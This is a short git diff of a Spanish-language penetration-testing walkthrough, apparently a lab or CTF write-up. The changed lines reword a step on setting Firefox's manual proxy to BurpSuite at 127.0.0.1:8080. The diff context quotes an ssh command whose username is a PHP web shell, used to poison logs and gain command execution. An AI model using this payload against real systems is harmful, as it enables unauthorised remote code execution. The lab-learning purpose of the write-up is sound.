@@ -91,9 +91,10 @@ ssh '<?php system($_GET['cmd']); ?>'@192.168.1.10 -p 2211
 
 - *Paso 7:* Configurar proxy y capturar solicitud GET con BurpSuite.
 
-Configuración de Firefox **>** Configuración de redes:
+Configuración de Firefox **>** Configuración de redes **>** Configuración de proxy manual
 
 HTTP Proxy: `127.0.0.1`
+
 Port: `8080`
 
 ![12](https://user-images.githubusercontent.com/75953873/175163339-db1853d5-b77c-47cb-86b5-0fa8e6e5fb28.png)
